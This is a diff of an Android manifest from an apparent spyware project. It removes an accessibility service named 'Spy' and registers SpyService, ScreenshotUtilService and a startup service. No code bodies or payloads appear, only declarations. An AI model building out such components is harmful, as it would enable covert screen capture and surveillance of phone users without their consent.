@@ -37,18 +37,9 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
-        <service android:name=".Spy"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:label="@string/accessibility_service_label">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
-        <service android:name=".SpyService" />
-        <service android:name=".ScreenshotUtilService" />
+        <service android:name="com.example.cristianturetta.spyware.SpyService" />
+        <service android:name="com.example.cristianturetta.spyware.ScreenshotUtilService" />
+        <service android:name="com.example.cristianturetta.spyware.StartupIntentService" />
 
     </application>
 </manifest>
